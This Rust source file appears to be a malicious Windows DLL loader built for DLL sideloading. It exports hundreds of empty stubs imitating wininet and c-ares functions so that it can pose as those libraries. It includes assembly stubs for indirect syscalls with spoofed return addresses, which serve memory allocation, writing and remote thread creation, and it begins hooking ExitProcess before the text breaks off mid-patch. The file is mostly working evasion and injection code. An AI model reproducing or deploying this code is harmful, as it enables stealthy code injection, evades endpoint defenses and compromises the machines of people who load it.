#![allow(non_snake_case)]

use std::arch::global_asm;
use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use base64::{Engine as _, engine::general_purpose};

mod syscall;
use syscall::{get_syscall_info, get_module_base, get_export_address, find_ret_gadget, SyscallInfo};

static mut ORIGINAL_EXIT_PROCESS: usize = 0;
#[no_mangle]
static mut NTDLL_RET_GADGET: *mut core::ffi::c_void = std::ptr::null_mut();
#[no_mangle]
static mut KERNEL32_RET_ADDR: *mut core::ffi::c_void = std::ptr::null_mut();

global_asm!(r#"
.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r11, [rsp + 0x38]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11
    mov r11, [rsp + 0x40]
    mov [rsp + 0x30], r11

    mov r11, [rsp + 0x48]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r11, [rsp + 0x60]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11
    mov r11, [rsp + 0x40]
    mov [rsp + 0x30], r11
    mov r11, [rsp + 0x48]
    mov [rsp + 0x38], r11
    mov r11, [rsp + 0x50]
    mov [rsp + 0x40], r11
    mov r11, [rsp + 0x58]
    mov [rsp + 0x48], r11
    mov r11, [rsp + 0x60]     
    mov [rsp + 0x50], r11
    mov r11, [rsp + 0x68]
    mov [rsp + 0x58], r11

    mov r11, [rsp + 0x70]
    mov r11, [r11 + 8]
    jmp r11

asm_nt_create_event:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_wait_for_single_object
asm_nt_wait_for_single_object:
    mov r11, r9
    mov r10, rcx
    mov eax, [r11]           

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11


    mov r11, [rsp + 0x28]
   
    mov r11, r9
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_user_show_window
asm_nt_user_show_window:
    mov r11, r8
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, r8
    mov r11, [r11 + 8]
    jmp r11
"#);

extern "C" {
    fn asm_nt_allocate_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        ZeroBits: usize,
        RegionSize: &mut usize,
        AllocationType: u32,
        Protect: u32,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_protect_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        NumberOfBytesToProtect: &mut usize,
        NewAccessProtection: u32,
        OldAccessProtection: &mut u32,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_write_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: *mut std::ffi::c_void,
        Buffer: *const std::ffi::c_void,
        NumberOfBytesToWrite: usize,
        NumberOfBytesWritten: &mut usize,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_create_thread_ex(
        ThreadHandle: &mut windows_sys::Win32::Foundation::HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut std::ffi::c_void,
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        StartRoutine: *mut std::ffi::c_void,
        Argument: *mut std::ffi::c_void,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: *mut std::ffi::c_void,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_create_event(
        EventHandle: &mut windows_sys::Win32::Foundation::HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut std::ffi::c_void,
        EventType: u32,
        InitialState: u8,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_wait_for_single_object(
        Handle: windows_sys::Win32::Foundation::HANDLE,
        Alertable: u8,
        Timeout: *mut i64,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_user_show_window(
        hwnd: windows::Win32::Foundation::HWND,
        n_cmd_show: u32,
        info: &SyscallInfo,
    ) -> windows::Win32::Foundation::BOOL;
}

macro_rules! export_function {
    ($name:ident) => {
        #[no_mangle]
        pub extern "system" fn $name() {}
    };
}

// AppCache fonksiyonları
export_function!(AppCacheCheckManifest);
export_function!(AppCacheCloseHandle);
export_function!(AppCacheCreateAndCommitFile);
export_function!(AppCacheDeleteGroup);
export_function!(AppCacheDeleteIEGroup);
export_function!(AppCacheDuplicateHandle);
export_function!(AppCacheFinalize);
export_function!(AppCacheFreeDownloadList);
export_function!(AppCacheFreeGroupList);
export_function!(AppCacheFreeIESpace);
export_function!(AppCacheFreeSpace);
export_function!(AppCacheGetDownloadList);
export_function!(AppCacheGetFallbackUrl);
export_function!(AppCacheGetGroupList);
export_function!(AppCacheGetIEGroupList);
export_function!(AppCacheGetInfo);
export_function!(AppCacheGetManifestUrl);
export_function!(AppCacheLookup);

// Commit/Delete fonksiyonları
export_function!(CommitUrlCacheEntryA);
export_function!(CommitUrlCacheEntryBinaryBlob);
export_function!(CommitUrlCacheEntryW);
export_function!(CreateMD5SSOHash);
export_function!(CreateUrlCacheContainerA);
export_function!(CreateUrlCacheContainerW);
export_function!(CreateUrlCacheEntryA);
export_function!(CreateUrlCacheEntryExW);
export_function!(CreateUrlCacheEntryW);
export_function!(CreateUrlCacheGroup);
export_function!(DeleteIE3Cache);
export_function!(DeleteUrlCacheContainerA);
export_function!(DeleteUrlCacheContainerW);
export_function!(DeleteUrlCacheEntry);
export_function!(DeleteUrlCacheEntryA);
export_function!(DeleteUrlCacheEntryW);
export_function!(DeleteUrlCacheGroup);
export_function!(DeleteWpadCacheForNetworks);
export_function!(DetectAutoProxyUrl);
export_function!(DispatchAPICall);

// Dll fonksiyonları
export_function!(DllCanUnloadNow);
export_function!(DllGetClassObject);
export_function!(DllInstall);
export_function!(DllRegisterServer);
export_function!(DllUnregisterServer);

// Find fonksiyonları
export_function!(FindCloseUrlCache);
export_function!(FindFirstUrlCacheContainerA);
export_function!(FindFirstUrlCacheContainerW);
export_function!(FindFirstUrlCacheEntryA);
export_function!(FindFirstUrlCacheEntryExA);
export_function!(FindFirstUrlCacheEntryExW);
export_function!(FindFirstUrlCacheEntryW);
export_function!(FindFirstUrlCacheGroup);
export_function!(FindNextUrlCacheContainerA);
export_function!(FindNextUrlCacheContainerW);
export_function!(FindNextUrlCacheEntryA);
export_function!(FindNextUrlCacheEntryExA);
export_function!(FindNextUrlCacheEntryExW);
export_function!(FindNextUrlCacheEntryW);
export_function!(FindNextUrlCacheGroup);
export_function!(ForceNexusLookup);
export_function!(ForceNexusLookupExW);
export_function!(FreeUrlCacheSpaceA);
export_function!(FreeUrlCacheSpaceW);

// Ftp fonksiyonları
export_function!(FtpCommandA);
export_function!(FtpCommandW);
export_function!(FtpCreateDirectoryA);
export_function!(FtpCreateDirectoryW);
export_function!(FtpDeleteFileA);
export_function!(FtpDeleteFileW);
export_function!(FtpFindFirstFileA);
export_function!(FtpFindFirstFileW);
export_function!(FtpGetCurrentDirectoryA);
export_function!(FtpGetCurrentDirectoryW);
export_function!(FtpGetFileA);
export_function!(FtpGetFileEx);
export_function!(FtpGetFileSize);
export_function!(FtpGetFileW);
export_function!(FtpOpenFileA);
export_function!(FtpOpenFileW);
export_function!(FtpPutFileA);
export_function!(FtpPutFileEx);
export_function!(FtpPutFileW);
export_function!(FtpRemoveDirectoryA);
export_function!(FtpRemoveDirectoryW);
export_function!(FtpRenameFileA);
export_function!(FtpRenameFileW);
export_function!(FtpSetCurrentDirectoryA);
export_function!(FtpSetCurrentDirectoryW);

// Get fonksiyonları
export_function!(GetProxyDllInfo);
export_function!(GetUrlCacheConfigInfoA);
export_function!(GetUrlCacheConfigInfoW);
export_function!(GetUrlCacheEntryBinaryBlob);
export_function!(GetUrlCacheEntryInfoA);
export_function!(GetUrlCacheEntryInfoExA);
export_function!(GetUrlCacheEntryInfoExW);
export_function!(GetUrlCacheEntryInfoW);
export_function!(GetUrlCacheGroupAttributeA);
export_function!(GetUrlCacheGroupAttributeW);
export_function!(GetUrlCacheHeaderData);

// Gopher fonksiyonları
export_function!(GopherCreateLocatorA);
export_function!(GopherCreateLocatorW);
export_function!(GopherFindFirstFileA);
export_function!(GopherFindFirstFileW);
export_function!(GopherGetAttributeA);
export_function!(GopherGetAttributeW);
export_function!(GopherGetLocatorTypeA);
export_function!(GopherGetLocatorTypeW);
export_function!(GopherOpenFileA);
export_function!(GopherOpenFileW);

// Http fonksiyonları
export_function!(HttpAddRequestHeadersA);
export_function!(HttpAddRequestHeadersW);
export_function!(HttpCheckDavCompliance);
export_function!(HttpCloseDependencyHandle);
export_function!(HttpDuplicateDependencyHandle);
export_function!(HttpEndRequestA);
export_function!(HttpEndRequestW);
export_function!(HttpGetServerCredentials);
export_function!(HttpGetTunnelSocket);
export_function!(HttpIndicatePageLoadComplete);
export_function!(HttpIsHostHstsEnabled);
export_function!(HttpOpenDependencyHandle);
export_function!(HttpOpenRequestA);
export_function!(HttpOpenRequestW);
export_function!(HttpPushClose);
export_function!(HttpPushEnable);
export_function!(HttpPushWait);
export_function!(HttpQueryInfoA);
export_function!(HttpQueryInfoW);
export_function!(HttpSendRequestA);
export_function!(HttpSendRequestExA);
export_function!(HttpSendRequestExW);
export_function!(HttpSendRequestW);
export_function!(HttpWebSocketClose);
export_function!(HttpWebSocketCompleteUpgrade);
export_function!(HttpWebSocketQueryCloseStatus);
export_function!(HttpWebSocketReceive);
export_function!(HttpWebSocketSend);
export_function!(HttpWebSocketShutdown);
export_function!(IncrementUrlCacheHeaderData);

// Internet fonksiyonları (A'dan Z'ye)
export_function!(InternetAlgIdToStringA);
export_function!(InternetAlgIdToStringW);
export_function!(InternetAttemptConnect);
export_function!(InternetAutodial);
export_function!(InternetAutodialCallback);
export_function!(InternetAutodialHangup);
export_function!(InternetCanonicalizeUrlA);
export_function!(InternetCanonicalizeUrlW);
export_function!(InternetCheckConnectionA);
export_function!(InternetCheckConnectionW);
export_function!(InternetClearAllPerSiteCookieDecisions);
export_function!(InternetCloseHandle);
export_function!(InternetCombineUrlA);
export_function!(InternetCombineUrlW);
export_function!(InternetConfirmZoneCrossing);
export_function!(InternetConfirmZoneCrossingA);
export_function!(InternetConfirmZoneCrossingW);
export_function!(InternetConnectA);
export_function!(InternetConnectW);
export_function!(InternetConvertUrlFromWireToWideChar);
export_function!(InternetCrackUrlA);
export_function!(InternetCrackUrlW);
export_function!(InternetCreateUrlA);
export_function!(InternetCreateUrlW);
export_function!(InternetDial);
export_function!(InternetDialA);
export_function!(InternetDialW);
export_function!(InternetEnumPerSiteCookieDecisionA);
export_function!(InternetEnumPerSiteCookieDecisionW);
export_function!(InternetErrorDlg);
export_function!(InternetFindNextFileA);
export_function!(InternetFindNextFileW);
export_function!(InternetFortezzaCommand);
export_function!(InternetFreeCookies);
export_function!(InternetFreeProxyInfoList);
export_function!(InternetGetCertByURL);
export_function!(InternetGetCertByURLA);
export_function!(InternetGetConnectedState);
export_function!(InternetGetConnectedStateEx);
export_function!(InternetGetConnectedStateExA);
export_function!(InternetGetConnectedStateExW);
export_function!(InternetGetCookieA);
export_function!(InternetGetCookieEx2);
export_function!(InternetGetCookieExA);
export_function!(InternetGetCookieExW);
export_function!(InternetGetCookieW);
export_function!(InternetGetLastResponseInfoA);
export_function!(InternetGetLastResponseInfoW);
export_function!(InternetGetPerSiteCookieDecisionA);
export_function!(InternetGetPerSiteCookieDecisionW);
export_function!(InternetGetProxyForUrl);
export_function!(InternetGetSecurityInfoByURL);
export_function!(InternetGetSecurityInfoByURLA);
export_function!(InternetGetSecurityInfoByURLW);
export_function!(InternetGoOnline);
export_function!(InternetGoOnlineA);
export_function!(InternetGoOnlineW);
export_function!(InternetHangUp);
export_function!(InternetInitializeAutoProxyDll);
export_function!(InternetLockRequestFile);
export_function!(InternetOpenA);
export_function!(InternetOpenUrlA);
export_function!(InternetOpenUrlW);
export_function!(InternetOpenW);
export_function!(InternetQueryDataAvailable);
export_function!(InternetQueryFortezzaStatus);
export_function!(InternetQueryOptionA);
export_function!(InternetQueryOptionW);
export_function!(InternetReadFile);
export_function!(InternetReadFileExA);
export_function!(InternetReadFileExW);
export_function!(InternetSecurityProtocolToStringA);
export_function!(InternetSecurityProtocolToStringW);
export_function!(InternetSetCookieA);
export_function!(InternetSetCookieEx2);
export_function!(InternetSetCookieExA);
export_function!(InternetSetCookieExW);
export_function!(InternetSetCookieW);
export_function!(InternetSetDialState);
export_function!(InternetSetDialStateA);
export_function!(InternetSetDialStateW);
export_function!(InternetSetFilePointer);
export_function!(InternetSetOptionA);
export_function!(InternetSetOptionExA);
export_function!(InternetSetOptionExW);
export_function!(InternetSetOptionW);
export_function!(InternetSetPerSiteCookieDecisionA);
export_function!(InternetSetPerSiteCookieDecisionW);
export_function!(InternetSetSecureLegacyServersAppCompat);
export_function!(InternetSetStatusCallback);
export_function!(InternetSetStatusCallbackA);
export_function!(InternetSetStatusCallbackW);
export_function!(InternetShowSecurityInfoByURL);
export_function!(InternetShowSecurityInfoByURLA);
export_function!(InternetShowSecurityInfoByURLW);
export_function!(InternetTimeFromSystemTime);
export_function!(InternetTimeFromSystemTimeA);
export_function!(InternetTimeFromSystemTimeW);
export_function!(InternetTimeToSystemTime);
export_function!(InternetTimeToSystemTimeA);
export_function!(InternetTimeToSystemTimeW);
export_function!(InternetUnlockRequestFile);
export_function!(InternetWriteFile);
export_function!(InternetWriteFileExA);
export_function!(InternetWriteFileExW);
export_function!(IsHostInProxyBypassList);
export_function!(IsUrlCacheEntryExpiredA);
export_function!(IsUrlCacheEntryExpiredW);
export_function!(LoadUrlCacheContent);
export_function!(ParseX509EncodedCertificateForListBoxEntry);
export_function!(PrivacyGetZonePreferenceW);
export_function!(PrivacySetZonePreferenceW);
export_function!(ReadUrlCacheEntryStream);
export_function!(ReadUrlCacheEntryStreamEx);
export_function!(RegisterUrlCacheNotification);
export_function!(ResumeSuspendedDownload);
export_function!(RetrieveUrlCacheEntryFileA);
export_function!(RetrieveUrlCacheEntryFileW);
export_function!(RetrieveUrlCacheEntryStreamA);
export_function!(RetrieveUrlCacheEntryStreamW);
export_function!(RunOnceUrlCache);
export_function!(SetUrlCacheConfigInfoA);
export_function!(SetUrlCacheConfigInfoW);
export_function!(SetUrlCacheEntryGroup);
export_function!(SetUrlCacheEntryGroupA);
export_function!(SetUrlCacheEntryGroupW);
export_function!(SetUrlCacheEntryInfoA);
export_function!(SetUrlCacheEntryInfoW);
export_function!(SetUrlCacheGroupAttributeA);
export_function!(SetUrlCacheGroupAttributeW);
export_function!(SetUrlCacheHeaderData);
export_function!(ShowCertificate);
export_function!(ShowClientAuthCerts);
export_function!(ShowSecurityInfo);
export_function!(ShowX509EncodedCertificate);
export_function!(UnlockUrlCacheEntryFile);
export_function!(UnlockUrlCacheEntryFileA);
export_function!(UnlockUrlCacheEntryFileW);
export_function!(UnlockUrlCacheEntryStream);
export_function!(UpdateUrlCacheContentPath);
export_function!(UrlCacheCheckEntriesExist);
export_function!(UrlCacheCloseEntryHandle);
export_function!(UrlCacheContainerSetEntryMaximumAge);
export_function!(UrlCacheCreateContainer);
export_function!(UrlCacheFindFirstEntry);
export_function!(UrlCacheFindNextEntry);
export_function!(UrlCacheFreeEntryInfo);
export_function!(UrlCacheFreeGlobalSpace);
export_function!(UrlCacheGetContentPaths);
export_function!(UrlCacheGetEntryInfo);
export_function!(UrlCacheGetGlobalCacheSize);
export_function!(UrlCacheGetGlobalLimit);
export_function!(UrlCacheReadEntryStream);
export_function!(UrlCacheReloadSettings);
export_function!(UrlCacheRetrieveEntryFile);
export_function!(UrlCacheRetrieveEntryStream);
export_function!(UrlCacheServer);
export_function!(UrlCacheSetGlobalLimit);
export_function!(UrlCacheUpdateEntryExtraData);
export_function!(UrlZonesDetach);
export_function!(_GetFileExtensionFromUrl);

export_function!(ares_array_at);
export_function!(ares_array_at_const);
export_function!(ares_array_claim_at);
export_function!(ares_array_create);
export_function!(ares_array_destroy);
export_function!(ares_array_finish);
export_function!(ares_array_first);
export_function!(ares_array_first_const);
export_function!(ares_array_insert_at);
export_function!(ares_array_insert_first);
export_function!(ares_array_insert_last);
export_function!(ares_array_insertdata_at);
export_function!(ares_array_insertdata_first);
export_function!(ares_array_insertdata_last);
export_function!(ares_array_last);
export_function!(ares_array_last_const);
export_function!(ares_array_len);
export_function!(ares_array_remove_at);
export_function!(ares_array_remove_first);
export_function!(ares_array_remove_last);
export_function!(ares_array_set_size);
export_function!(ares_array_sort);
export_function!(ares_buf_append);
export_function!(ares_buf_append_be16);
export_function!(ares_buf_append_be32);
export_function!(ares_buf_append_byte);
export_function!(ares_buf_append_finish);
export_function!(ares_buf_append_num_dec);
export_function!(ares_buf_append_num_hex);
export_function!(ares_buf_append_start);
export_function!(ares_buf_append_str);
export_function!(ares_buf_begins_with);
export_function!(ares_buf_consume);
export_function!(ares_buf_consume_charset);
export_function!(ares_buf_consume_line);
export_function!(ares_buf_consume_nonwhitespace);
export_function!(ares_buf_consume_until_charset);
export_function!(ares_buf_consume_until_seq);
export_function!(ares_buf_consume_whitespace);
export_function!(ares_buf_create);
export_function!(ares_buf_create_const);
export_function!(ares_buf_destroy);
export_function!(ares_buf_fetch_be16);
export_function!(ares_buf_fetch_be32);
export_function!(ares_buf_fetch_bytes);
export_function!(ares_buf_fetch_bytes_dup);
export_function!(ares_buf_fetch_bytes_into_buf);
export_function!(ares_buf_fetch_str_dup);
export_function!(ares_buf_finish_bin);
export_function!(ares_buf_finish_str);
export_function!(ares_buf_get_position);
export_function!(ares_buf_hexdump);
export_function!(ares_buf_len);
export_function!(ares_buf_load_file);
export_function!(ares_buf_parse_dns_binstr);
export_function!(ares_buf_parse_dns_str);
export_function!(ares_buf_peek);
export_function!(ares_buf_peek_byte);
export_function!(ares_buf_reclaim);
export_function!(ares_buf_replace);
export_function!(ares_buf_set_length);
export_function!(ares_buf_set_position);
export_function!(ares_buf_split);
export_function!(ares_buf_split_str);
export_function!(ares_buf_split_str_array);
export_function!(ares_buf_tag);
export_function!(ares_buf_tag_clear);
export_function!(ares_buf_tag_fetch);
export_function!(ares_buf_tag_fetch_bytes);
export_function!(ares_buf_tag_fetch_constbuf);
export_function!(ares_buf_tag_fetch_strdup);
export_function!(ares_buf_tag_fetch_string);
export_function!(ares_buf_tag_length);
export_function!(ares_buf_tag_rollback);
export_function!(ares_cancel);
export_function!(ares_create_query);
export_function!(ares_destroy);
export_function!(ares_destroy_options);
export_function!(ares_dns_addr_to_ptr);
export_function!(ares_dns_class_fromstr);
export_function!(ares_dns_class_tostr);
export_function!(ares_dns_opcode_tostr);
export_function!(ares_dns_opt_get_datatype);
export_function!(ares_dns_opt_get_name);
export_function!(ares_dns_parse);
export_function!(ares_dns_pton);
export_function!(ares_dns_rcode_tostr);
export_function!(ares_dns_rec_type_fromstr);
export_function!(ares_dns_rec_type_tostr);
export_function!(ares_dns_record_create);
export_function!(ares_dns_record_destroy);
export_function!(ares_dns_record_duplicate);
export_function!(ares_dns_record_get_flags);
export_function!(ares_dns_record_get_id);
export_function!(ares_dns_record_get_opcode);
export_function!(ares_dns_record_get_rcode);
export_function!(ares_dns_record_query_add);
export_function!(ares_dns_record_query_cnt);
export_function!(ares_dns_record_query_get);
export_function!(ares_dns_record_query_set_name);
export_function!(ares_dns_record_query_set_type);
export_function!(ares_dns_record_rr_add);
export_function!(ares_dns_record_rr_cnt);
export_function!(ares_dns_record_rr_del);
export_function!(ares_dns_record_rr_get);
export_function!(ares_dns_record_rr_get_const);
export_function!(ares_dns_record_set_id);
export_function!(ares_dns_rr_add_abin);
export_function!(ares_dns_rr_del_abin);
export_function!(ares_dns_rr_del_opt_byid);
export_function!(ares_dns_rr_get_abin);
export_function!(ares_dns_rr_get_abin_cnt);
export_function!(ares_dns_rr_get_addr);
export_function!(ares_dns_rr_get_addr6);
export_function!(ares_dns_rr_get_bin);
export_function!(ares_dns_rr_get_class);
export_function!(ares_dns_rr_get_keys);
export_function!(ares_dns_rr_get_name);
export_function!(ares_dns_rr_get_opt);
export_function!(ares_dns_rr_get_opt_byid);
export_function!(ares_dns_rr_get_opt_cnt);
export_function!(ares_dns_rr_get_str);
export_function!(ares_dns_rr_get_ttl);
export_function!(ares_dns_rr_get_type);
export_function!(ares_dns_rr_get_u16);
export_function!(ares_dns_rr_get_u32);
export_function!(ares_dns_rr_get_u8);
export_function!(ares_dns_rr_key_datatype);
export_function!(ares_dns_rr_key_to_rec_type);
export_function!(ares_dns_rr_key_tostr);
export_function!(ares_dns_rr_set_addr);
export_function!(ares_dns_rr_set_addr6);
export_function!(ares_dns_rr_set_bin);
export_function!(ares_dns_rr_set_opt);
export_function!(ares_dns_rr_set_str);
export_function!(ares_dns_rr_set_u16);
export_function!(ares_dns_rr_set_u32);
export_function!(ares_dns_rr_set_u8);
export_function!(ares_dns_section_tostr);
export_function!(ares_dns_write);
export_function!(ares_dup);
export_function!(ares_expand_name);
export_function!(ares_expand_string);
export_function!(ares_fds);
export_function!(ares_free);
export_function!(ares_free_array);
export_function!(ares_free_data);
export_function!(ares_free_hostent);
export_function!(ares_free_string);
export_function!(ares_freeaddrinfo);
export_function!(ares_get_servers);
export_function!(ares_get_servers_csv);
export_function!(ares_get_servers_ports);
export_function!(ares_getaddrinfo);
export_function!(ares_gethostbyaddr);
export_function!(ares_gethostbyname);
export_function!(ares_gethostbyname_file);
export_function!(ares_getnameinfo);
export_function!(ares_getsock);
export_function!(ares_htable_asvp_create);
export_function!(ares_htable_asvp_destroy);
export_function!(ares_htable_asvp_get);
export_function!(ares_htable_asvp_get_direct);
export_function!(ares_htable_asvp_insert);
export_function!(ares_htable_asvp_keys);
export_function!(ares_htable_asvp_num_keys);
export_function!(ares_htable_asvp_remove);
export_function!(ares_htable_dict_create);
export_function!(ares_htable_dict_destroy);
export_function!(ares_htable_dict_get);
export_function!(ares_htable_dict_get_direct);
export_function!(ares_htable_dict_insert);
export_function!(ares_htable_dict_keys);
export_function!(ares_htable_dict_num_keys);
export_function!(ares_htable_dict_remove);
export_function!(ares_htable_strvp_claim);
export_function!(ares_htable_strvp_create);
export_function!(ares_htable_strvp_destroy);
export_function!(ares_htable_strvp_get);
export_function!(ares_htable_strvp_get_direct);
export_function!(ares_htable_strvp_insert);
export_function!(ares_htable_strvp_num_keys);
export_function!(ares_htable_strvp_remove);
export_function!(ares_htable_szvp_create);
export_function!(ares_htable_szvp_destroy);
export_function!(ares_htable_szvp_get);
export_function!(ares_htable_szvp_get_direct);
export_function!(ares_htable_szvp_insert);
export_function!(ares_htable_szvp_num_keys);
export_function!(ares_htable_szvp_remove);
export_function!(ares_htable_vpstr_create);
export_function!(ares_htable_vpstr_destroy);
export_function!(ares_htable_vpstr_get);
export_function!(ares_htable_vpstr_get_direct);
export_function!(ares_htable_vpstr_insert);
export_function!(ares_htable_vpstr_num_keys);
export_function!(ares_htable_vpstr_remove);
export_function!(ares_htable_vpvp_create);
export_function!(ares_htable_vpvp_destroy);
export_function!(ares_htable_vpvp_get);
export_function!(ares_htable_vpvp_get_direct);
export_function!(ares_htable_vpvp_insert);
export_function!(ares_htable_vpvp_num_keys);
export_function!(ares_htable_vpvp_remove);
export_function!(ares_inet_ntop);
export_function!(ares_inet_pton);
export_function!(ares_init);
export_function!(ares_init_options);
export_function!(ares_is_hostname);
export_function!(ares_library_cleanup);
export_function!(ares_library_init);
export_function!(ares_library_init_mem);
export_function!(ares_library_initialized);
export_function!(ares_llist_clear);
export_function!(ares_llist_create);
export_function!(ares_llist_destroy);
export_function!(ares_llist_first_val);
export_function!(ares_llist_insert_after);
export_function!(ares_llist_insert_before);
export_function!(ares_llist_insert_first);
export_function!(ares_llist_insert_last);
export_function!(ares_llist_last_val);
export_function!(ares_llist_len);
export_function!(ares_llist_node_claim);
export_function!(ares_llist_node_destroy);
export_function!(ares_llist_node_first);
export_function!(ares_llist_node_idx);
export_function!(ares_llist_node_last);
export_function!(ares_llist_node_mvparent_first);
export_function!(ares_llist_node_mvparent_last);
export_function!(ares_llist_node_next);
export_function!(ares_llist_node_parent);
export_function!(ares_llist_node_prev);
export_function!(ares_llist_node_replace);
export_function!(ares_llist_node_val);
export_function!(ares_llist_replace_destructor);
export_function!(ares_malloc);
export_function!(ares_malloc_zero);
export_function!(ares_memeq);
export_function!(ares_memeq_ci);
export_function!(ares_memmem);
export_function!(ares_mkquery);
export_function!(ares_parse_a_reply);
export_function!(ares_parse_aaaa_reply);
export_function!(ares_parse_caa_reply);
export_function!(ares_parse_mx_reply);
export_function!(ares_parse_naptr_reply);
export_function!(ares_parse_ns_reply);
export_function!(ares_parse_ptr_reply);
export_function!(ares_parse_soa_reply);
export_function!(ares_parse_srv_reply);
export_function!(ares_parse_txt_reply);
export_function!(ares_parse_txt_reply_ext);
export_function!(ares_parse_uri_reply);
export_function!(ares_process);
export_function!(ares_process_fd);
export_function!(ares_process_fds);
export_function!(ares_process_pending_write);
export_function!(ares_query);
export_function!(ares_query_dnsrec);
export_function!(ares_queue_active_queries);
export_function!(ares_queue_wait_empty);
export_function!(ares_realloc);
export_function!(ares_realloc_zero);
export_function!(ares_reinit);
export_function!(ares_save_options);
export_function!(ares_search);
export_function!(ares_search_dnsrec);
export_function!(ares_send);
export_function!(ares_send_dnsrec);
export_function!(ares_set_local_dev);
export_function!(ares_set_local_ip4);
export_function!(ares_set_local_ip6);
export_function!(ares_set_pending_write_cb);
export_function!(ares_set_server_state_callback);
export_function!(ares_set_servers);
export_function!(ares_set_servers_csv);
export_function!(ares_set_servers_ports);
export_function!(ares_set_servers_ports_csv);
export_function!(ares_set_socket_callback);
export_function!(ares_set_socket_configure_callback);
export_function!(ares_set_socket_functions);
export_function!(ares_set_socket_functions_ex);
export_function!(ares_set_sortlist);
export_function!(ares_str_isalnum);
export_function!(ares_str_isnum);
export_function!(ares_str_isprint);
export_function!(ares_str_lower);
export_function!(ares_str_ltrim);
export_function!(ares_str_rtrim);
export_function!(ares_str_trim);
export_function!(ares_strcasecmp);
export_function!(ares_strcaseeq);
export_function!(ares_strcaseeq_max);
export_function!(ares_strcmp);
export_function!(ares_strcpy);
export_function!(ares_strdup);
export_function!(ares_streq);
export_function!(ares_streq_max);
export_function!(ares_strerror);
export_function!(ares_strlen);
export_function!(ares_strncasecmp);
export_function!(ares_strncmp);
export_function!(ares_strnlen);
export_function!(ares_threadsafety);
export_function!(ares_timeout);
export_function!(ares_tolower);
export_function!(ares_version);

unsafe fn init_gadgets() -> Option<()> {
    let ntdll_base = get_module_base("ntdll.dll")?;
    let kernel32_base = get_module_base("kernel32.dll")?;

    NTDLL_RET_GADGET = find_ret_gadget(ntdll_base)?;
    KERNEL32_RET_ADDR = find_ret_gadget(kernel32_base)?;

    Some(())
}

unsafe fn hook_exit_process() {
    if let (Some(kernel32_base), Some(nt_protect_info), Some(nt_write_info)) = (
        get_module_base("kernel32.dll"),
        get_syscall_info("ntdll.dll", "NtProtectVirtualMemory"),
        get_syscall_info("ntdll.dll", "NtWriteVirtualMemory"),
    ) {
        if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
            let exit_proc_ptr = exit_proc_addr as *mut u8;
            ORIGINAL_EXIT_PROCESS = exit_proc_ptr as usize;

            let mut base_address = exit_proc_ptr as *mut std::ffi::c_void;
            let mut region_size = 12usize;
            let mut old_protect = 0u32;

            asm_nt_protect_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut base_address,
                &mut region_size,
                0x04, // PAGE_READWRITE
                &mut old_protect,
                &nt_protect_info,
            );

            let hook_addr = fake_exit_process as usize;
            let patch: [u8; 12] = [
                0x48, 0xB8,
                (hook_addr & 0xFF) as u8,
                ((hook_addr >> 8) & 0xFF) as u8,
                ((hook_addr >> 16) & 0xFF) as u8,
                ((hook_addr >> 24) & 0xFF) as u8,
